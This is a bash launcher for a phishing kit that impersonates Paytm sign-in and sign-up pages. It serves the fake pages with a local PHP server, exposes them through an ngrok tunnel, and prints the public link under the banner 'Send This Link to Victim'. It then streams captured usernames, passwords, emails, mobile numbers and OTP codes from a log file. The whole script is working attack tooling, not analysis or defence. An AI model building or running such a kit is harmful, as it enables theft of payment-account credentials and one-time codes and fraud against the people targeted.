#!/bin/bash 

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

} 

if [[ -e log.txt ]]; then
rm -rf log.txt
else
echo
fi
touch log.txt




sleep 2
# spinner
spinlong ()
{
   bar=" +++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
   barlenght=${#bar}
   i=o
   while ((i < 100 )); do
	   n=$((i*barlenght / 100 ))
	   printf "\e[00;32m\r[%-${barlenght}s]\e[00m" "${bar:0:n}"
	   ((i += RANDOM%5+2))
	   sleep 0.4
   done
}


#clolors
white='\e[1;37m'
green='\e[0;32m'
blue='\e[1;34m'
red='\e[1;31m'
yellow='\e[1;33m' 
       
echo""
echo""
                clear
                chmod 777 Logo.sh
                ./Logo.sh
                echo -e $'\e[1;33m[\e[0m\e[1;77m 1 \e[0m\e[1;33m]\e[0m\e[1;32m Paytm Sign In \e[0m' 
                echo -e $'\e[1;33m[\e[0m\e[1;77m 2 \e[0m\e[1;33m]\e[0m\e[1;32m Paytm Sign UP \e[0m' 
                echo ""
                read -p $'\e[1;33m[\e[0m\e[1;77m + \e[0m\e[1;33m]\e[0m\e[1;32m Enter Your Choice : \e[0m' option
	        case $option in 
	        1) cd paytm/
                echo ""
                sleep 1
                php -S 127.0.0.1:8080 > /dev/null 2>&1 &
                sleep 2
                ./ngrok http 8080 > /dev/null 2>&1 &
                sleep 15
                link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                echo ""
                sleep 8    
                clear
                chmod +x Logo.sh  
                ./Logo.sh
                echo ""                    
                echo   -e $yellow "// [ Send This Link to Victim ] //" $link
                echo ""
                echo ""
                echo -e $green "//  [ CREDENTIAL ] //"
                echo ""
                tail -f log.txt | grep -e "username" -e "password" -e "otp"



                ;;
	        
	        2) cd signup/
                echo ""
                sleep 1
                php -S 127.0.0.1:8080 > /dev/null 2>&1 &
                sleep 2
                ./ngrok http 8080 > /dev/null 2>&1 &
                sleep 15
                link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                echo ""
                sleep 8    
                clear
                chmod +x Logo.sh  
                ./Logo.sh
                echo ""                    
                echo   -e $yellow "// [ Send This Link to Victim ] //" $link
                echo ""
                echo ""
                echo -e $green "//  [ CREDENTIAL ] //"
                echo ""
                tail -f log.txt | grep -e "email" -e "loginPassword" -e "mobileNumber" -e "otp"



                ;;
                esac
                ;;